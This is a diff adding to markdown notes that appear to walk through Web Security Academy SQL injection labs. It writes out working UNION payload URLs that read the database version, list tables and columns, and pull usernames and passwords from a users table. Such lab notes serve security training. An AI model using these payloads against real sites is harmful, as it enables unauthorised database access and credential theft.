@@ -127,7 +127,36 @@ For example, you could use a `UNION` attack with the following input:
 
 `' UNION SELECT @@version--`
 
+Regular:
+
+`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts`
+
+Modified:
+
+`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
+
+### Listing the database contents on non-Oracle databases
+
+Regular:
+
+`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts`
+
+Modified:
+
+See all available tables:
+
+`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
+
+Find the table that you are interested in. Then change the following query with the table (mine was "users\_ddvsxa"):
+
+`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_ddvsxa%27--`
+
+Find the names of the columns containing what you are looking for (usernames/passwords). For me, it was **username\_czehbi** and **password\_jwcmoz** Then modify the following query:
+
+`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username_czehbi,+password_jwcmoz+FROM+users_ddvsxa--`
 
 
 
 
+
+``
